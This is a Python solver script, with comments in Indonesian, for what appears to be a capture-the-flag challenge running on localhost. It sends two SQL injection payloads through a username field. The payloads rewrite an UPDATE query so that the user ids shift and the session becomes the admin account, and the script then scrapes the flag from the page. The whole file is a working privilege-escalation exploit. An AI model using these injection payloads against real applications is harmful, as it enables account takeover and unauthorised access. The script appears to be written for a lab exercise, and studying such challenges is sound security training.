import requests
import re
import sys

# Ganti URL jika server berjalan di port atau host lain
URL = "http://127.0.0.1:7272"

def solve(url):
    session = requests.Session()
    
    # 1. Inisialisasi sesi agar server membuat database SQLite unik untuk kita
    print("[*] Menghubungkan ke server untuk inisialisasi sesi...")
    try:
        r = session.get(url)
    except requests.exceptions.ConnectionError:
        print(f"[-] Gagal terhubung ke {url}. Pastikan server sudah berjalan.")
        return

    # 2. Payload pertama: Mengubah id admin dari 0 menjadi 2
    # Query yang dieksekusi server: 
    # UPDATE users SET name="", id=2 WHERE id=0 --" WHERE id=1
    payload_1 = '", id=2 WHERE id=0 --'
    print(f"[*] Mengirim payload 1: {payload_1}")
    session.post(url + "/set-username", data={"username": payload_1})
    
    # 3. Payload kedua: Mengurangi seluruh id sebesar 1
    # Proses berjalan urut: id=1 menjadi 0, lalu id=2 menjadi 1
    # Query yang dieksekusi server: 
    # UPDATE users SET name="", id=id-1 --" WHERE id=1
    payload_2 = '", id=id-1 --'
    print(f"[*] Mengirim payload 2: {payload_2}")
    session.post(url + "/set-username", data={"username": payload_2})
    
    # 4. Refresh halaman utama untuk login sebagai admin (karena sekarang admin berada di id=1)
    print("[*] Merefresh halaman untuk mendapatkan flag...")
    r = session.get(url)
    
    # Mengambil teks flag dari respons HTML
    match = re.search(r'id="the-flag">(.*?)</div>', r.text)
    if match:
        flag = match.group(1).strip()
        print(f"\n[+] EKSPLOITASI BERHASIL! Flag yang didapat: \n{flag}")
    else:
        print("\n[-] Gagal menemukan flag di dalam halaman. Pastikan server merespons dengan benar.")
        print(f"Potongan respons HTML: {r.text[:500]}")

if __name__ == "__main__":
    target_url = sys.argv[1] if len(sys.argv) > 1 else URL
    solve(target_url)
